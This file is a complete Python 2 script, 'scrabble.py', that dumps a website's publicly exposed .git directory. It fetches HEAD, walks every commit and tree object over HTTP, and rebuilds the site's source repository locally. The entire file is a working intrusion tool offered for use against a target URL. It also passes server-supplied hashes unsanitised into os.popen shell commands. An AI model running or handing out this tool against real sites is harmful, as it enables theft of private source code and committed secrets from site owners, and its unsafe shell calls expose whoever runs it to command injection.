import sys
import urllib2
import os

def request_data(url):
	request = urllib2.Request(url)
	return urllib2.urlopen(request).read()
	
def downloadBlob(hash):
	print "  downloadBlob "+hash
	
	if not os.path.exists(folder+hash[0:2]):
		os.mkdir(folder+hash[0:2])
	
	data = request_data(domain+"/.git/objects/"+hash[0:2]+'/'+hash[2:40])	
	with open(folder+hash[0:2]+'/'+hash[2:40],'wb') as f:
		f.write(data)
		
def parseTree(hash):
	print "  parseTree "+hash
	downloadBlob(hash)
	lines = os.popen("git cat-file -p "+hash)
	line = lines.readline()
	while line:
		line = line.split(' ')
		type = line[1]
		hash = line[2][0:40]
		if type=='tree':
			parseTree(hash)
		else:
			downloadBlob(hash)
		line = lines.readline()
	
def parseCommit(hash):
	print "parseCommit "+hash[0:40]
	downloadBlob(hash)
	blob = os.popen("git cat-file -p "+hash)
	tree = blob.readline().split(' ')[1][0:40]
	parseTree(tree)
	parent = blob.readline().split(' ')
	if parent[0]=="parent":
		parseCommit(parent[1][0:40])
	
if len(sys.argv) == 1:
    msg ="missing target url\n\nUsage: scrabble.py <url>\nExample: scrabble.py http://example.com/\n\nYou need make sure target url had .git folder"
    print msg
    sys.exit(0)
	
if __name__=='__main__':
	domain = sys.argv[-1]
	ref = request_data(domain+"/.git/HEAD").split(' ')[1]
	lastHash = request_data(domain+"/.git/"+ref)[0:40]
	
	os.popen("git init")
	print "git init"
	
	folder = ".git/objects/"
	parseCommit(lastHash)
	with open(".git/refs/heads/master",'wb') as f:
		f.write(lastHash)
	os.popen("git reset --hard")
	print "git reset --hard"
